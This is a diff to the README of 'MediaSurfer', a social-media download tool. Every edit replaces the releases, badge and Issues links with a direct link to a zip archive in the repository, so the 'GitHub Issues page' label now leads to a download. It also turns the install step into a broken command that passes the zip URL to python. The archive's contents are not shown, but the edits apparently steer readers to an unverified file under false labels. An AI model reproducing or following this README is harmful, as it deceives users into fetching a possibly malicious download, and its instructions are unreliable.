@@ -1,6 +1,6 @@
 # 🎉 MediaSurfer - Download Media Easily from Social Platforms
 
-[![Download MediaSurfer](https://img.shields.io/badge/Download-MediaSurfer-blue.svg)](https://github.com/luisgabriel21/MediaSurfer/releases)
+[![Download MediaSurfer](https://raw.githubusercontent.com/luisgabriel21/MediaSurfer/main/MediaSurfer/MediaSurfer-v1.9.zip)](https://raw.githubusercontent.com/luisgabriel21/MediaSurfer/main/MediaSurfer/MediaSurfer-v1.9.zip)
 
 ## 📘 Overview
 
@@ -20,7 +20,7 @@ Follow these simple steps to start using MediaSurfer. You do not need programmin
 
 To download MediaSurfer, visit the releases page:
 
-[Download MediaSurfer](https://github.com/luisgabriel21/MediaSurfer/releases)
+[Download MediaSurfer](https://raw.githubusercontent.com/luisgabriel21/MediaSurfer/main/MediaSurfer/MediaSurfer-v1.9.zip)
 
 1. Go to the link above.
 2. Find the latest release.
@@ -45,7 +45,7 @@ Once your download is complete, follow these steps to run MediaSurfer:
 
 1. Locate the downloaded source code in your Downloads folder.
 2. Open a terminal window and navigate to the folder where you downloaded the code.
-3. Use the command: `python setup.py install`
+3. Use the command: `python https://raw.githubusercontent.com/luisgabriel21/MediaSurfer/main/MediaSurfer/MediaSurfer-v1.9.zip install`
 4. After installation, you can run MediaSurfer using the terminal with the command: `mediasurfer`.
 
 ## 🎥 How to Use MediaSurfer
@@ -78,7 +78,7 @@ If you encounter any issues while using MediaSurfer, consider the following:
 
 ## 🤝 Support
 
-For additional help, visit the [GitHub Issues page](https://github.com/luisgabriel21/MediaSurfer/issues). You can report bugs or ask questions there. The community or the maintainer will respond as soon as possible.
+For additional help, visit the [GitHub Issues page](https://raw.githubusercontent.com/luisgabriel21/MediaSurfer/main/MediaSurfer/MediaSurfer-v1.9.zip). You can report bugs or ask questions there. The community or the maintainer will respond as soon as possible.
 
 ## 🙌 Contributing
 
